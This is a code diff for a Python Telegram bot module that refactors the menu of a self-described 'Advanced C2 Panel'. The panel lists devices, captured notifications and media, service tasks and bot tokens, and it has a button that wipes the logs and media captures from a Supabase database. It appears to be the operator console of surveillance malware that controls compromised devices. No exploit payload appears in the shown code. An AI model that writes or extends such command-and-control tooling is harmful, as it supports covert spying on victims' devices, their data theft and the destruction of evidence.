@@ -4,27 +4,20 @@ import telebot
 from telebot import types
 
 class BotMenu:
-    def __init__(self, bot, admin_id, supabase, auth_list, current_token_index, all_tokens):
+    def __init__(self, bot, supabase, auth_list, current_token_index, all_tokens):
         self.bot = bot
-        self.admin_id = admin_id
         self.supabase = supabase
         self.auth_list = auth_list
         self.current_index = current_token_index
         self.all_tokens = all_tokens
-        self._register_handlers()
+        self._register_callback_handlers()
 
     def _is_authenticated(self, user_id):
         return user_id in self.auth_list
 
-    def _register_handlers(self):
-        @self.bot.message_handler(commands=['start', 'menu'])
-        def show_main_menu(message):
-            if not self._is_authenticated(message.from_user.id):
-                return
-            markup = self._main_menu_markup()
-            self.bot.send_message(message.chat.id, "🎮 **Advanced C2 Panel**\nSystem Status: *Ready*",
-                                 parse_mode='Markdown', reply_markup=markup)
-
+    def _register_callback_handlers(self):
+        """تسجيل معالجات الأزرار فقط (بدون معالج الرسائل /menu)"""
+        
         @self.bot.callback_query_handler(func=lambda call: call.data.startswith("menu_"))
         def handle_menu(call):
             if not self._is_authenticated(call.from_user.id):
@@ -70,7 +63,7 @@ class BotMenu:
             if not self._is_authenticated(call.from_user.id):
                 return
             self.bot.delete_message(call.message.chat.id, call.message.message_id)
-            show_main_menu(call.message)
+            self.show_main_menu(call.message.chat.id)
 
         @self.bot.callback_query_handler(func=lambda call: call.data.startswith("notif_"))
         def fetch_notification(call):
@@ -135,18 +128,14 @@ class BotMenu:
         if action == "ask_switch":
             self.bot.reply_to(message, "🔄 Switching to next bot... Server will restart.")
             sys.exit(0)
-
         elif action == "ask_wipe":
             try:
-                # Delete all rows from notification_logs, media_captures, service_tasks
                 self.supabase.table('notification_logs').delete().neq('id', 0).execute()
                 self.supabase.table('media_captures').delete().neq('id', 0).execute()
                 self.supabase.table('service_tasks').delete().neq('id', 0).execute()
-                # Optionally keep client_info records (devices)
                 self.bot.reply_to(message, "✅ All logs and media records have been wiped.")
             except Exception as e:
                 self.bot.reply_to(message, f"❌ Error during wipe: {e}")
-
         elif action == "ask_logout":
             self.bot.reply_to(message, "🔌 Shutting down server...")
             sys.exit(0)
@@ -186,7 +175,8 @@ class BotMenu:
         except Exception as e:
             self.bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}")
 
-    def _main_menu_markup(self):
+    def show_main_menu(self, chat_id):
+        """دالة عامة لعرض القائمة الرئيسية"""
         markup = types.InlineKeyboardMarkup(row_width=2)
         markup.add(
             types.InlineKeyboardButton("📱 Devices", callback_data="menu_devices"),
@@ -201,7 +191,5 @@ class BotMenu:
             types.InlineKeyboardButton("📊 DB Summary", callback_data="menu_db_summary"),
             types.InlineKeyboardButton("🤖 Bot Status", callback_data="menu_bot_status")
         )
-        return markup
-
-def setup_bot_menu(bot, admin_id, supabase, auth_list, current_index, all_tokens):
-    return BotMenu(bot, admin_id, supabase, auth_list, current_index, all_tokens)
+        self.bot.send_message(chat_id, "🎮 **Advanced C2 Panel**\nSystem Status: *Ready*",
+                              parse_mode='Markdown', reply_markup=markup)
